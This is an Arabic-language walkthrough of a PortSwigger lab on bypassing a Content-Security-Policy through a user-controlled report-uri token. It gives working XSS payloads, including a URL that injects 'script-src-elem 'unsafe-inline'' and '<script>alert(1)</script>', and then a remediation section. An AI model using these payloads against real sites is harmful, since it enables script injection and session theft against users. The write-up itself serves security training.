# [Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)

## **`الهدف`**
قم بتنفيذ هجوم `XSS` يتخطى الـ `CSP` ويستدعي دالة `alert`.
## **`خطوات الحل`**
إذا قمنا بحقن الأمر التالي فى حقل البحث
```JS
<img src=1 onerror=alert(1)>
```

سنلاحظ أن الـ `Payload` ينعكس، لكن `CSP` يمنع تنفيذ السكريبت.

وإذا توجهنا إلى `Burp Proxy`، سنلاحظ أن الاستجابة تحتوي على ترويسة `Content-Security-Policy`، وأن توجيه `report-uri` يحتوي على معلم يسمى `token`.
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
X-Frame-Options: SAMEORIGIN
Content-Length: 3278
```

وبما أنه يمكنك التحكم في مُعامل `token`، يمكنك إضافة توجيهات `CSP` الخاصة بك إلى السياسة.

لذلك سنقوم بحقن الأمر التالي كـ `Parameter` في نهاية الـ `URL`  الخاص باللاب لننتهي من حل اللاب.
```JS
search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```
ليصبح كالتالي
```URL
https://0a5600d30453754b802d129900d400fa.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

وبعد الانتقال إليه سيتم عمل `URL Encoded` له ليصبح كالتالي:
```URL
https://0a5600d30453754b802d129900d400fa.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C/script%3E&token=;script-src-elem%20%27unsafe-inline%27
```

وتستخدم عملية الحقن توجيه` script-src-elem` في `CSP` يتيح لك هذا التوجيه استهداف عناصر `script` فقط. 
وباستخدام هذا التوجيه، يمكنك استبدال قواعد `script-src` الموجودة، مما يُمكنك من حقن `unsafe-inline`، والذي يسمح لك باستخدام السكريبتات المضمنة.
## **`ترقيع الثغرة`**
يجب على السيرفر تطبيق آلية ترميز المخرجات `Output Encoding` لتحويل رموز `HTML` الخاصة إلى نصوص آمنة، فحتى لو تمكن المهاجم من إرسال كود `XSS` خبيث، سيتدخل المتصفح ويعرضه كنص مقروء ويمنع تنفيذ دالة `alert 1` بفضل هذا الترميز.

ويجب على السيرفر تطبيق سياسة التحقق من المدخلات `Input Validation` بناء على قائمة بيضاء `Whitelist` لرفض أي رموز غير متوقعة، فحتى لو حاول المهاجم التلاعب بالبيانات من جهة العميل، سيتدخل السيرفر ويرفض الطلب ويمنع إدخال أكواد `JavaScript` بفضل هذه الفلترة الصارمة.

ويجب على المطور منع ثغرة حقن الترويسات `Header Injection` عن طريق عدم تمرير مدخلات المستخدم مباشرة داخل ترويسة `Content-Security-Policy`، ويجب إنشاء قيمة الـ `token` الخاصة بتوجيه `report-uri` بشكل آمن وعشوائي من جهة السيرفر غير قابلة للتعديل من قبل المستخدم، فحتى لو حاول المهاجم حقن توجيهات إضافية مثل `script-src-elem`، سيتدخل السيرفر ويرفض دمج هذه المدخلات في الترويسة ويمنع التلاعب بسياسة الأمان بفضل هذه المعالجة الآمنة.

ويجب على مسؤول النظام إعداد جدار حماية تطبيقات الويب `WAF` لفحص وتحليل جميع الطلبات الواردة، فحتى لو نسي المطورون ترقيع الثغرة برمجيا، سيتدخل الـ `WAF` ويحظر الطلب المشبوه الذي يحتوي على توجيهات حماية خبيثة في الروابط ويمنع وصول الـ `Payload` إلى السيرفر بفضل قواعد الحماية `Rules` المحدثة.

وكخطوة أمان إضافية، بالرغم من أنها لن تمنع هذه الثغرة، يجب تفعيل خاصية `HttpOnly` لملفات تعريف الارتباط الخاصة بالجلسة `Session Cookies`، وعلى الرغم أن هذا الإجراء لن يمنع ثغرة الـ `XSS` من الحدوث، ولكنه سيمنع كود الجافاسكريبت الخبيث من الوصول إلى الجلسة عبر `document.cookie`، مما يفشل محاولات اختراق الحساب `Account Takeover`.
